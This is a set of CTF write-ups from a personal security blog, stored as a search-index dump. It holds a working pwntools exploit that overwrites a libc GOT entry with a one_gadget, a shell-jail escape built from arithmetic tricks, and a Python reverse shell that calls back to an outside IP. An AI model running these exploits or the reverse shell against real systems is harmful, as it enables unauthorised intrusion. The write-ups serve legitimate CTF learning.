pwn.2020.chall.actf.co 20733.\n Attachments  bookface.tar.gz\n The attached tarball contains the following files:\n   File Description     bookface the main binary   bookface.","tags":null,"title":"Angstrom CTF 2020 - bookface","type":"post"},{"authors":null,"categories":null,"content":"Challenge details    Event Challenge Category Points     CSAW CTF Final 2019 defile PWN 100    Description  wild handlock main btw\nnc pwn.chal.csaw.io 1004\n Attachments  defile libc.so.6\n The binary is a dynamically linked ELF 64-bit executable, it has all protections enabled.\n$ file defile defile: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5631f2588790fa344f6f360d39819963f4f66d7f, not stripped $ checksec --file defile Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled When running this binary, it will give you the address of stdout in libc, and ask for How much do you want to write?, Where do you want to write? and What do you want to write?, then print Bye!.\nSo it looks like an intended vulnerability, we have an arbitrary write.\nAfter analyzing the binary, I found that the binary have two functions: main and get_number, the get_number function simply read an unsigned long from stdin and return it, while the main function ask for the input size then check if the size \u0026lt;= 256 otherwise it will print That's just too much, then it ask for the address where to write and finally read the input by calling read function with the parameters read(0, buf, nbytes), where buf is the address we provided and nbytes the size of input.\nSince the binary is compiled with full RELRO and PIE enabled we can\u0026rsquo;t overwrite anything in the binary (e.g. .got, .dtors, \u0026hellip;) (as far as I know), so we need to find something else to overwrite, I noticed that there a call to puts function after calling to read function, So we need find some hooks or function pointers that puts function use.\nTo do that I just set a break point at main+228 where main call puts then step into puts functions.\nI noticed that puts will call __tunable_get_val@plt at puts+13, make sure that you are debugging the target libc, not the local one.\ngef\u0026gt; set environment LD_PRELOAD ./libc.so.6 gef\u0026gt; b *main+228 b *main+228 Breakpoint 1 at 0xa19 gef\u0026gt; r Starting program: /opt/ctf/defile Here's stdout: 0x7fcd74c16760 How much do you want to write? 0 Where do you want to write? 0 What do you want to write? ... ... gef\u0026gt; disas puts Dump of assembler code for function puts: 0x00007fcd748aa9c0 \u0026lt;+0\u0026gt;:\tpush r13 0x00007fcd748aa9c2 \u0026lt;+2\u0026gt;:\tpush r12 0x00007fcd748aa9c4 \u0026lt;+4\u0026gt;:\tmov r12,rdi 0x00007fcd748aa9c7 \u0026lt;+7\u0026gt;:\tpush rbp 0x00007fcd748aa9c8 \u0026lt;+8\u0026gt;:\tpush rbx 0x00007fcd748aa9c9 \u0026lt;+9\u0026gt;:\tsub rsp,0x8 0x00007fcd748aa9cd \u0026lt;+13\u0026gt;:\tcall 0x7fcd7484b100 \u0026lt;__tunable_get_val@plt+16\u0026gt; Since the libc is not compiled with Full RELRO, we can overwrite __tunable_get_val .got entry\n$ checksec --file libc.so.6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled In order to do that we need to calculate to offset between stdout and __tunable_get_val .got entry, so step into __tunable_get_val@plt+16 and get the .got entry address\n... ... gef\u0026gt; x/3i 0x7fcd7484b100 =\u0026gt; 0x7fcd7484b100 \u0026lt;__tunable_get_val@plt+16\u0026gt;:\tjmp QWORD PTR [rip+0x3c9fa2] # 0x7fcd74c150a8 0x7fcd7484b106 \u0026lt;__tunable_get_val@plt+22\u0026gt;:\tpush 0x20 0x7fcd7484b10b \u0026lt;__tunable_get_val@plt+27\u0026gt;:\tjmp 0x7fcd7484afd0 ... ... gef\u0026gt; p 0x7fcd74c16760 - 0x7fcd74c150a8 $1 = 0x16b8 Here the stdout address is 0x7fcd74c16760, the .got entry address is: 0x7fcd74c150a8 and the offset is 0x16b8\nNow we can control RIP register, but we have only one shot, we can\u0026rsquo;t do any ROP chaining, so we need to find one_gadget RCE in that libc (see one_gadget).\n$ one_gadget libc.so.6 0x4f2c5 execve(\u0026quot;/bin/sh\u0026quot;, rsp+0x40, environ) constraints: rcx == NULL 0x4f322 execve(\u0026quot;/bin/sh\u0026quot;, rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\u0026quot;/bin/sh\u0026quot;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL Exploit  get the stdout address calculate the address of __tunable_get_val got entry calculate the libc base address calculate the one_gadget address overwrite the got entry with one_gadget address.  Exploit code import subprocess from pwn import * HOST = \u0026#34;pwn.chal.csaw.io\u0026#34; PORT = 1004 def get_one_gadget(filename): return list(map( int, subprocess.check_output([\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).split(b\u0026#39; \u0026#39;) )) def exploit(): offset = 0x16b8 libc = ELF(\u0026#34;./libc.so.6\u0026#34;) stdout_libc = libc.sym[\u0026#34;_IO_2_1_stdout_\u0026#34;] log.info(\u0026#34;stdout_libc: 0x%08x\u0026#34; % stdout_libc) # one gadget RCE offsets one_gadgets = get_one_gadget(\u0026#39;./libc.so.6\u0026#39;) log.info(\u0026#34;one gadget RCE offsets: %s\u0026#34; % str(one_gadgets)) target = remote(HOST, PORT) target.recvuntil(\u0026#34;Here\u0026#39;s stdout:\\n\u0026#34;) buf = target.recvline().strip() stdout = int(buf, 16) log.info(\u0026#34;stdout: 0x%08x\u0026#34; % stdout) libc_base = stdout - stdout_libc log.info(\u0026#34;libc_base: 0x%08x\u0026#34; % libc_base) got_entry = stdout - offset one_gadget_libc = libc_base + one_gadgets[2] log.info(\u0026#34;got_entry: 0x%08x\u0026#34; % got_entry) log.info(\u0026#34;one_gadget: 0x%08x\u0026#34; % one_gadget_libc) target.recvuntil(\u0026#34;do you want to write?\\n\u0026#34;) target.sendline(\u0026#39;8\u0026#39;) target.recvuntil(\u0026#34;Where do you want to write?\\n\u0026#34;) target.send(str(got_entry)) target.recvuntil(\u0026#34;What do you want to write?\\n\u0026#34;) target.sendline(p64(one_gadget_libc)) target.sendline(\u0026#34;id;cat flag.txt;exit\u0026#34;) buf = target.recvall() if b\u0026#34;uid\u0026#34; in buf: log.success(buf.decode()) else: log.failure(buf.decode()) if __name__ == \u0026#34;__main__\u0026#34;: exploit() Running the exploit Flag  flag{me_you_in_room_1337_tonight}\n ","date":1573480034,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1573480034,"objectID":"f250f081635d38be8569776550f98feb","permalink":"https://philomath213.github.io/post/csaw-ctf-finals-2019-defile/","publishdate":"2019-11-11T14:47:14+01:00","relpermalink":"/post/csaw-ctf-finals-2019-defile/","section":"post","summary":"Challenge details    Event Challenge Category Points     CSAW CTF Final 2019 defile PWN 100    Description  wild handlock main btw\nnc pwn.chal.csaw.io 1004\n Attachments  defile libc.so.6\n The binary is a dynamically linked ELF 64-bit executable, it has all protections enabled.\n$ file defile defile: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.","tags":null,"title":"CSAW CTF Finals 2019 - defile","type":"post"},{"authors":null,"categories":null,"content":"","date":1562716800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1562716800,"objectID":"34bf15b6b84950bbf54e07d5661ee88a","permalink":"https://philomath213.github.io/project/malware-revealer/","publishdate":"2019-07-10T00:00:00Z","relpermalink":"/project/malware-revealer/","section":"project","summary":"Malware Revealer is a malware classification framework, designed primarily for malware detection, it contains a modular toolset for feature extraction, as well as pre-trained models and a ready to use web API for making predictions.","tags":["Artificial Intelligence","Development","Security"],"title":"Malware Revealer","type":"project"},{"authors":null,"categories":null,"content":"Securinets CTF Quals 2019 - Special Revenge WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Special Revenge PWN 1000 5    Description  After the disappointment of last year challenge \u0026ldquo;special\u0026rdquo;, I came this year with a mystery revenge.\nssh special@51.254.114.246\npassword : b8f07e1000c719c6a7febde4ec0ab24d\nAuthor : Anis_Boss\n Another jail escape challenge, we were provided with ssh login (username special).\nAfter being logged in to the server we will get this welcome message, and a prompt where we can type our command.\n================================ Welcome to Special Revenge ================================ || ||\u0026lt;(.)\u0026gt;||\u0026lt;(.)\u0026gt;|| || || _|| || ||_ || || (__D || C__) || || (__D || C__) || || (__D || C__) || || (__D || C__) || || || || || || ================================ Securinets - Quals ================================ \u0026gt;\u0026gt; As expected we can execute the usual command in this very restricted shell (ls, cat, id), also we didn\u0026rsquo;t get any error message by typing these commands.\n\u0026gt;\u0026gt; ls \u0026gt;\u0026gt; id \u0026gt;\u0026gt; cat /etc/passwd \u0026gt;\u0026gt; echo helloooooo I tried to escape this jail by sending interrupt signal (CTRL+Z) since this a ssh session, and I got this message \u0026quot;Hemm, nice one but you can't escape\u0026quot;, it seems that signal handler are altered by the jail script.\nThen I typed all alphanumeric characters to see if there any filters or a whitelist for words/characters, and got this very helpful error message.\n\u0026gt;\u0026gt; 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ ./mystery.sh: line 29: 1: command not found which means that all the alphanumeric charset is filtered except 1 (1: command not found), and the jail script is executing the filter input at the end.\nI also did some tests to see if there are any allowed special characters, because with only 1 there are no way to escape this jail, each time I put 1 at the beginning and at the end and see what left between them.\n\u0026gt;\u0026gt; 1~`/;@#1 ./mystery.sh: line 29: 1#1: command not found This means that ~`/;@ are filtered while # is allowed.\nAfter few attempts, I figure out that only these characters are allowed 1\u0026lt;\\\u0026quot;#$'(){}\nSo how can we escape this jail using just these 11 chars !!!!.\nObjective Our objective is escaping this jail, How ??, by executing /bin/sh or just sh for short to spawn a shell, or by typing break to break the loop, \u0026hellip;\nthe easiest one is spawning a shell by executing the sh command, so we need to build the sh string using the allowed characters.\nOur Arsenal Despite the fact that all alphabetic are filtered, we have quit a few tricks at our disposal that we can use to build any command.\n$# # number of arguments, evaluates as 0 in this case $((expr)) # evaluate an arithmetic expression $\u0026#39;\\116\u0026#39; # convert octal to a character in string literal The 1st trick: $# evaluates as 0\n\u0026gt;\u0026gt; $# ./mystery.sh: line 29: 0: command not found So we have 1 and 0 in our hands, what come in my mind first was binary, since everything is built upon binary we can for sure build anything using these two lovely characters.\nThe 2nd trick: $((expr)) will evaluate the arithmetic expression expr and return the result.\n#examples $ echo $((1+1)) # addition 2 $ echo $((6-1)) # subtraction 5 $ echo $((2*3)) # multiplication 6 $ echo $((6/2)) # division 3 $ echo $((2\u0026lt;\u0026lt;4)) # shift left 32 $ echo $((32\u0026gt;\u0026gt;4)) # shift right 2 $ echo $((2#1010)) # convert binary value to decimal 10 The last one is what we need, but we don\u0026rsquo;t have the character 2.\nFortunately we can get 2 just by shifting left 1 by one bit\n$ echo $((1\u0026lt;\u0026lt;1)) 2 # $((1\u0026lt;\u0026lt;1)) =\u0026gt; 2 # $# =\u0026gt; 0 # $(($((1\u0026lt;\u0026lt;1))#1$#1$#)) =\u0026gt; $((2#1010)) =\u0026gt; 10 echo $(($((1\u0026lt;\u0026lt;1))#1$#1$#)) 10 The 3rd trick, $'\\116' convert the octal value 116 to a character N in string literal.\n$ echo $\u0026#39;\\163\u0026#39;$\u0026#39;\\150\u0026#39; sh Remark I noticed that the input will be evaluate recursively twice, something like eval(eval(INPUT)).\nWhen I run \\$\\'\\\\1$#1\\' in my bash I get this:\n$ \\$\\'\\\\1$#1\\' bash: $'\\101': command not found but when running the same input in the jail, I get this:\n\u0026gt;\u0026gt; \\$\\'\\\\1$#1\\' /opt/mystery.sh: line 29: A: command not found Putting the Pieces Together \\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#1$#$#$#11))\\'\\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#$#1$#11$#))\\' # 1st evaluation =\u0026gt; \\$\\'\\\\$((2#10100011))\\'\\$\\'\\\\$((2#10010110))\\' =\u0026gt; \\$\\'\\\\163\\'\\$\\'\\\\150\\' =\u0026gt; $'\\163'$'\\150' # 2nd evaluation =\u0026gt; sh \u0026gt;\u0026gt; \\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#1$#$#$#11))\\'\\$\\'\\\\$(($((1\u0026lt;\u0026lt;1))#1$#$#1$#11$#))\\' $ id uid=1015(special) gid=1015(special) groups=1015(special) $ ls -la total 28 dr-xr-xr-x 2 special special 4096 Mar 22 02:02 . drwxr-xr-x 22 root root 4096 Mar 24 10:18 .. -rw-r--r-- 1 special special 220 Sep 1 2015 .bash_logout -rw-r--r-- 1 special special 3771 Sep 1 2015 .bashrc -rw-r----- 1 root special 47 Mar 22 02:02 flag.txt -rw-r-x--- 1 root special 752 Mar 22 01:55 mystery -rw-r--r-- 1 special special 655 May 16 2017 .profile $ cat flag.txt securinets{bash_never_stop_from_being_awesome} Conclusion Jail challenges are always painful at the beginning, so they require more patient than usual challenges. A good understanding of the shell environment and built-ins can be handful in scenarios like this one.\nFLAG: securinets{bash_never_stop_from_being_awesome}\n","date":1553511579,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1553511579,"objectID":"af34e38bf5839daefc3098e12229d057","permalink":"https://philomath213.github.io/post/securinets-ctf-quals-2019-special-revenge/","publishdate":"2019-03-25T11:59:39+01:00","relpermalink":"/post/securinets-ctf-quals-2019-special-revenge/","section":"post","summary":"Securinets CTF Quals 2019 - Special Revenge WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Special Revenge PWN 1000 5    Description  After the disappointment of last year challenge \u0026ldquo;special\u0026rdquo;, I came this year with a mystery revenge.\nssh special@51.254.114.246\npassword : b8f07e1000c719c6a7febde4ec0ab24d\nAuthor : Anis_Boss\n Another jail escape challenge, we were provided with ssh login (username special).","tags":null,"title":"Securinets CTF Quals 2019 Special Revenge","type":"post"},{"authors":null,"categories":null,"content":"Securinets CTF Quals 2019 - Stone Mining WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Stone Mining PWN 1000 4    Description  I went inside a mine thinking it was safe, but got stuck. Help me out.\nService is running at: nc 52.17.200.40 4000\nAuthor: bibiwars\n A jail escape challenge this time, with no prompt, probably a shell jail.\nJail - Stone Mining Objective is to read 'flag' file from the current directory ___________________________________________________________ we can start by executing some random commands:\nshell: id, echo foobar, whoami \u0026hellip;\npython: print(\u0026ldquo;foobar\u0026rdquo;), dir() \u0026hellip;\n\u0026hellip;\nid Not today, some blacklisted caracter has been used echo foobar Not today, some blacklisted caracter has been used print(\u0026quot;foboar\u0026quot;) Not today, some blacklisted caracter has been used dir() Not today, some blacklisted caracter has been used We got only one message \u0026ldquo;Not today, some blacklisted caracter has been used\u0026rdquo;, which means that there are some blacklisted chars.\na Not today, some blacklisted caracter has been used b Command executed :D c Not today, some blacklisted caracter has been used d Command executed :D e Command executed :D f Not today, some blacklisted caracter has been used 0 Not today, some blacklisted caracter has been used 1 Not today, some blacklisted caracter has been used 2 Not today, some blacklisted caracter has been used 3 Not today, some blacklisted caracter has been used As we can see, at least there some allowed chars.\nAfter some testing I found that these ascii lower case chars are allowed\nertyuopdghbn There are other allowed chars, but I used only these char to escape the jail.\nSo how can we bypass that ?\nI first noticed that we can use \u0026ldquo;python\u0026rdquo; word since all its chars are allowed.\nI made an attempt to print to stdout, but didn\u0026rsquo;t get any output\n$ nc 52.17.200.40 4000 Jail - Stone Mining Objective is to read 'flag' file from the current directory ___________________________________________________________ python print('foobar') exit() ^C So, I made an assumption that stdout, and stderr are closed, or filtered. Therefore, I attempt to connect to the outside using python sockets.\nI start a listener on my host and connect to it.\nRemote Host:\n$ nc 52.17.200.40 4000 Jail - Stone Mining Objective is to read 'flag' file from the current directory ___________________________________________________________ python import socket s = socket.socket() s.connect(('41.102.162.29', 2130)) s.send(b'test\\n') ^C My host:\nnc -vvntlp 2130 Listening on any address 2130 (xds) Connection from 41.102.162.29:39198 test Total received bytes: 5 Total sent bytes: 0 So it works fine, after closing the connection (CTRL+C to close netcat).\nPutting the Pieces Together The goal is getting reverse shell.\nFirst, Run the python interpreter.\npython Then copy/past the payload there, the script won\u0026rsquo;t execute til the connection is closed, since we are using netcat we need to send interrupt signal CTRL+C to close the connection.\nimport subprocess cmd = [\u0026#34;python\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;41.102.162.29\u0026#34;,2130)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;] subprocess.Popen(cmd) I used \u0026ldquo;subprocess.Popen\u0026rdquo; and run the \u0026ldquo;python -c\u0026rdquo;, to spawn a new background process, in order to avoid killing the process after closing the connection. we won\u0026rsquo;t see any output in this jail, but you will get a reverser shell.\n$ nc -vvntlp 2130 Listening on any address 2130 (xds) Connection from 41.102.162.29:39190 $ id uid=999(ctf) gid=999(ctf) groups=999(ctf) $ ls -la total 12 drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 . drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 .. -rwxr-x--- 1 root ctf 59 Mar 23 04:17 flag $ cat flag c2VjdXJpbmV0c3szODExMjc5Zjg4M2JkM2Q3ZWFkZjU3NmNlY2Y4ZDVjYn0$ $ cat flag | base64 -d securinets{3811279f883bd3d7eadf576cecf8d5cb} $ Jails could be escaped taking various ways.\nI\u0026rsquo;m not sure if the solution I come to is the intended one.\nFLAG: securinets{3811279f883bd3d7eadf576cecf8d5cb}\n","date":1553450446,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1553450446,"objectID":"331987ca913bff49ed26b3aaf4bec034","permalink":"https://philomath213.github.io/post/securinets-ctf-quals-2019-stone-mining/","publishdate":"2019-03-24T19:00:46+01:00","relpermalink":"/post/securinets-ctf-quals-2019-stone-mining/","section":"post","summary":"Securinets CTF Quals 2019 - Stone Mining WriteUp Challenge details    Event Challenge Category Points Solves     Securinets CTF Quals 2019 Stone Mining PWN 1000 4    Description  I went inside a mine thinking it was safe, but got stuck. Help me out.\nService is running at: nc 52.17.200.40 4000\nAuthor: bibiwars\n A jail escape challenge this time, with no prompt, probably a shell jail.","tags":null,"title":"Securinets CTF Quals 2019 Stone Mining","type":"post"},{"authors":[],"categories":null,"content":"","date":1544869800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1544869800,"objectID":"b385d3e9186dfca02d0fc89b8dbdd685","permalink":"https://philomath213.github.io/talk/sql-injection/","publishdate":"2018-12-06T00:00:00Z","relpermalink":"/talk/sql-injection/","section":"talk","summary":"Introduction to SQL Injection.","tags":[],"title":"SQL INJECTION","type":"talk"},{"authors":[],"categories":null,"content":"","date":1543660200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1543660200,"objectID":"e7565e6100b90cf8523a3f05d01aab1a","permalink":"https://philomath213.github.io/talk/docker-from-a-to-b/","publishdate":"2018-12-02T00:00:00Z","relpermalink":"/talk/docker-from-a-to-b/","section":"talk","summary":"Docker Key Concepts.","tags":[],"title":"Docker From A to B","type":"talk"},{"authors":null,"categories":null,"content":"Sharif CTF 8 - ElGamat WriteUp Challenge details    Event Challenge Category Points     Sharif CTF 8 ElGamat Crypto 200    Description  ElGamal over Matrices: algebra-focused crypto challenge\nyou can find full description in ElGamat.pdf\n Attachments  Matrices.txt\n Solution This problem appears to be similar to the discrete logarithm problem (see Discrete logarithm), but instead of the generator g we a have a matrix \\(G\\), So we need to find \\(x\\) such that \\(G^x = H\\) (both \\(G\\) and \\(H\\) are \\(5\\times5\\) Matrices).\nMatrices =\u0026gt; Linear Algebra: this challenge requires some fundamentals in linear algebra.\nAt the beginning I tried to diagonalize the matrix \\(G\\) and \\(H\\) in order to transform the problem to a discrete logarithm problem, but it will stay hard to solve since \\(p-1\\) is not a product of small primes which in this case Pohlig–Hellman algorithm is not an efficient method for computing the discrete logarithms.\nAfter doing some googling I figure out that in order to make this problem easy to solve we need to put both Matrices \\(G\\) and \\(H\\) in Jordan normal form (see Jordan normal form)\nA Jordan matrix has each non-zero off-diagonal entry equal to \\(1\\), immediately above the main diagonal.\nfor A a Jordan block as \\(2\\times2\\) matrix, if we have a repeated eigenvalues:\n$$ A = \\begin{pmatrix} \\lambda \u0026amp; 1 \\\\ 0 \u0026amp; \\lambda \\end{pmatrix} $$ for \\(B = A^x\\): $$ B = \\begin{pmatrix} \\lambda^x \u0026amp; x\\lambda^{x-1} \\\\ 0 \u0026amp; \\lambda^x \\end{pmatrix} $$\n$$x = {-b \\pm \\sqrt{b^2-4ac} \\over 2a}.$$\ntherefore in this case: $$ B_{12} = xB_{11}A_{11}^{-1} \\iff x = A_{11}B_{12}B_{11}^{-1} $$\nNow we need to apply this solution to ElGamat problem\nIn our case \\(G[3][3]\\) to \\(G[4][4]\\) is a Jordan block with repeated eigenvalues, and all arithmetic operations are in Quotient Ring \\(Z/Z_p\\)\nthis is my code in sage (ElGamat.sage):\nimport hashlib p = 1461501637330902918203684832716283019655932542983 G = [ [1287397632974625907369332145667695136576732725719, 999149001044306271168727399637009399486427921379, 1046504160269652701583906344218556291030141088947, 724446625683754938181565321149725788430461092168, 1071845980147173642753960259602135592110139561915], [947603660931904341080240982051313712707367037453, 312289846563741934103580532543082761760226637905, 494739786803547247505263837170488583876166831850, 680540462980071181450018491798299105995449257198, 2602258415762368797405060707505977243346704576], [996213673531855992829525358578006610606634622631, 1025711294257038288640877971869685565227647136954, 1432432135773706484846126533752827108541355741973, 1238541870126055576875033883691918425137600727481, 1130938956963588695293783764965618873887596017827], [1320933266015680090206505704792362493057963931979, 1151746112645644166669332171392580649376526147475, 117512451110908867093773368598681106589771485221, 78071463743800894350883457304401524272336187149, 350437511649326676405126284689545814008237687775], [438339253001275654203062260777687750937184662400, 372483950165136927369598298270629892810999203086, 859008773869616460027135965589262417694174453098, 1174526536643808668299968641952541506024584582818, 13201859260259503932772826643483081858286638179] ] H = [ [903022231855038558383593109888227525558007552960, 565977275270298825053282757799743346899236483368, 989303675765663596792169321947495382568831693037, 601579288654704389384765634776493921679315260303, 913791750749394879333717884106841876340654737006], [1159121456278955861257379214176694847802842944213, 55304385436577133507085707981392660143782780650, 559867756424853909301288957105188829240808301823, 1230859641388132364539374469026906952870988170695, 1423995124592695628047882256427827379994877406997], [1125565199147204322161069021173152827232960621114, 1373772036013472137002755957284397215018630262515, 640623873603434273377865546046279663852895430999, 1056809237992218798189986002766547616222871640976, 1426649441470162608512662468308504390861950649943], [303729376872199895471546635639837180361513146712, 1163767872227950278851006729914569662442255257700, 1320342731346163804219021270875175061467772367004, 433001013681018647747911760920686992297849343282, 1149024280460224794070159244078925721991430685838], [23661702916810298505759145354543089608241235601, 1048655828654821525617176122368805879408325508567, 587846047820504813842423941849757078103027466928, 1338365929525105225695097114139069216753339875455, 1425543850003062038868121400064269552725872690214] ] R = IntegerModRing(p) M = MatrixSpace(R, 5, 5) g = M(G) h = M(H) g, p_mat = g.jordan_form(transformation=True) print \u0026#39;[+] jordan normal for G:\u0026#39; for i in g: print i h = p_mat.inverse()*h*p_mat print \u0026#39;[+] jordan normal for H:\u0026#39; for i in h: print i a11 = g[3][3] b11 = h[3][3] b12 = h[3][4] x = a11*b12/b11 assert b12 == x*a11^(x-1) print \u0026#39;[+] solution:\u0026#39;, x def flag_gen(alpha): return \u0026#39;SharifCTF{%s}\u0026#39; % hashlib.md5(str(alpha).encode()).hexdigest() print \u0026#39;[+] FLAG:\u0026#39;, flag_gen(x) ","date":1537996768,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537996768,"objectID":"f0758ea9fe54a9f27a8b76bb9327c10d","permalink":"https://philomath213.github.io/post/sharifctf8_elgamat/","publishdate":"2018-09-26T22:19:28+01:00","relpermalink":"/post/sharifctf8_elgamat/","section":"post","summary":"Sharif CTF 8 - ElGamat WriteUp Challenge details    Event Challenge Category Points     Sharif CTF 8 ElGamat Crypto 200    Description  ElGamal over Matrices: algebra-focused crypto challenge\nyou can find full description in ElGamat.pdf\n Attachments  Matrices.txt\n Solution This problem appears to be similar to the discrete logarithm problem (see Discrete logarithm), but instead of the generator g we a have a matrix \\(G\\), So we need to find \\(x\\) such that \\(G^x = H\\) (both \\(G\\) and \\(H\\) are \\(5\\times5\\) Matrices).","tags":null,"title":"SharifCTF8_ElGamat","type":"post"},{"authors":null,"categories":null,"content":"philomath213: InfoSec Enthusiast, RE, PWN, Crypto | Docker Lover | CTF player at Sudo_root team | Student at ESI-SBA.\nYou can check out my projects and writings in this blog.\nYou can also find me on social networks and github (the links are in the button of the page)\n","date":1537992681,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537992681,"objectID":"405ba581599f556cd14af94d199e20b1","permalink":"https://philomath213.github.io/page/about/","publishdate":"2018-09-26T21:11:21+01:00","relpermalink":"/page/about/","section":"page","summary":"philomath213: InfoSec Enthusiast, RE, PWN, Crypto | Docker Lover | CTF player at Sudo_root team | Student at ESI-SBA.\nYou can check out my projects and writings in this blog.\nYou can also find me on social networks and github (the links are in the button of the page)","tags":null,"title":"About","type":"page"},{"authors":null,"categories":null,"content":"","date":1527811200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1527811200,"objectID":"fd228902f5183d0e3ae7725fda5acc85","permalink":"https://philomath213.github.io/project/open-class/","publishdate":"2018-06-01T00:00:00Z","relpermalink":"/project/open-class/","section":"project","summary":"OpenClass is a web app that promote information sharing through organized workshops.","tags":["Development"],"title":"OpenClass","type":"project"},{"authors":null,"categories":null,"content":"","date":1496275200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1496275200,"objectID":"7035f80c58e8898fe2e2a1c71001f848","permalink":"https://philomath213.github.io/project/esi-linux/","publishdate":"2017-06-01T00:00:00Z","relpermalink":"/project/esi-linux/","section":"project","summary":"ESI Linux is a linux distribution made for ESI-SBA ( Ecole supérieure d'informatique - Sidi Bel Abbes) students particularly, it provides all the necessary tools for their curriculum.","tags":["Development"],"title":"ESI-LINUX","type":"project"}]